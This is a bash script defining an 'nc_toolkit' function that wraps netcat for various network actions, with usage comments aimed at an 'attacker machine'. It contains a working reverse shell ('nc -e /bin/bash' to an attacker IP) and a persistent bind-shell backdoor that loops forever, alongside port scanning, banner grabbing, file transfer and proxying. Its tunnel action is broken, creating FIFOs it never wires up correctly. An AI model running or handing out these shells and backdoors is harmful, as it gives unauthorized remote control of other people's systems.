# nc_toolkit - A versatile toolkit for network operations using netcat.
#
# Usage: nc_toolkit <action> [parameters]
#
# Available actions:
#   -h, --help                                                    - Show this help message
#   -r, --reverse_shell <attacker_ip> <port>                      - Create a reverse shell
#   -b, --backdoor <port>                                         - Set up a persistent backdoor
#   -p, --port_scan <target_ip> <start_port> <end_port>           - Perform a basic port scan
#   -fs, --file_transfer_send <file> <target_ip> <port>           - Send a file
#   -fr, --file_transfer_receive <output_file> <port>             - Receive a file
#   -px, --proxy <listen_port> <forward_to_ip> <forward_to_port>  - Set up a proxy
#   -bg, --banner_grab <target_ip> <port>                         - Grab a service banner
#   -nd, --network_debug <target_ip> <port>                       - Debug network connection
#   -t, --tunnel <listen_port> <target_ip> <target_port>          - Create a basic tunnel
#
# Parameters:
#   <attacker_ip>   - IP address of the attacker machine.
#   <port>          - Port number to use for the connection.
#   <target_ip>     - IP address of the target machine.
#   <start_port>    - Starting port number for port scan.
#   <end_port>      - Ending port number for port scan.
#   <file>          - File to be sent.
#   <output_file>   - File to save received data.
#   <listen_port>   - Port number to listen on.
#   <forward_to_ip> - IP address to forward the connection to.
#   <forward_to_port> - Port number to forward the connection to.
nc_toolkit() {
  local action=""
  local params=()

  set_action() {
    if [[ -n "$action" ]]; then
      echo "Only one action can be specified at a time."
      return 1
    fi
    action="$1"
    params=("${@:2}")
  }

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -h | --help)
        set_action "help"
        shift
        ;;
      -r | --reverse_shell)
        set_action "reverse_shell" "$2" "$3"
        shift 3
        ;;
      -b | --backdoor)
        set_action "backdoor" "$2"
        shift 2
        ;;
      -p | --port_scan)
        set_action "port_scan" "$2" "$3" "$4"
        shift 4
        ;;
      -fs | --file_transfer_send)
        set_action "file_transfer_send" "$2" "$3" "$4"
        shift 4
        ;;
      -fr | --file_transfer_receive)
        set_action "file_transfer_receive" "$2" "$3"
        shift 3
        ;;
      -px | --proxy)
        set_action "proxy" "$2" "$3" "$4"
        shift 4
        ;;
      -bg | --banner_grab)
        set_action "banner_grab" "$2" "$3"
        shift 3
        ;;
      -nd | --network_debug)
        set_action "network_debug" "$2" "$3"
        shift 3
        ;;
      -t | --tunnel)
        set_action "tunnel" "$2" "$3" "$4"
        shift 4
        ;;
      *)
        echo "Unknown option: $1"
        echo "Use -h or --help for usage information."
        return 1
        ;;
    esac
  done
  if [[ "$action" == "help" ]]; then
    echo "Usage: nc_toolkit <action> [parameters]"
    echo "Available actions:"
    echo "  -h, --help                                                    - Show this help message"
    echo "  -r, --reverse_shell <attacker_ip> <port>                      - Create a reverse shell"
    echo "  -b, --backdoor <port>                                         - Set up a persistent backdoor"
    echo "  -p, --port_scan <target_ip> <start_port> <end_port>           - Perform a basic port scan"
    echo "  -fs, --file_transfer_send <file> <target_ip> <port>           - Send a file"
    echo "  -fr, --file_transfer_receive <output_file> <port>             - Receive a file"
    echo "  -px, --proxy <listen_port> <forward_to_ip> <forward_to_port>  - Set up a proxy"
    echo "  -bg, --banner_grab <target_ip> <port>                         - Grab a service banner"
    echo "  -nd, --network_debug <target_ip> <port>                       - Debug network connection"
    echo "  -t, --tunnel <listen_port> <target_ip> <target_port>          - Create a basic tunnel"
    return 0
  fi

  case "$action" in
    "reverse_shell")
      nc -e /bin/bash "${params[0]}" "${params[1]}"
      ;;

    "backdoor")
      while true; do nc -l -p "${params[0]}" -e /bin/bash; done
      ;;

    "port_scan")
      for port in $(seq "${params[1]}" "${params[2]}"); do
        nc -zv "${params[0]}" "$port" 2>&1 | grep "succeeded!"
      done
      ;;

    "file_transfer_send")
      nc "${params[1]}" "${params[2]}" <"${params[0]}"
      ;;

    "file_transfer_receive")
      nc -l -p "${params[1]}" >"${params[0]}"
      ;;

    "proxy")
      nc -l -p "${params[0]}" -c "nc ${params[1]} ${params[2]}"
      ;;

    "banner_grab")
      echo "" | nc -v -n -w1 "${params[0]}" "${params[1]}"
      ;;

    "network_debug")
      nc -v "${params[0]}" "${params[1]}"
      ;;

    "tunnel")
      mkfifo /tmp/fifo
      mkfifo /tmp/fifo_in /tmp/fifo_out
      nc -l -p "${params[0]}" </tmp/fifo_in | nc "${params[1]}" "${params[2]}" >/tmp/fifo_out
      rm /tmp/fifo_in /tmp/fifo_out
      rm /tmp/fifo
      ;;

    *)
      echo "Unknown action. Use -h or --help for available actions."
      ;;
  esac
}
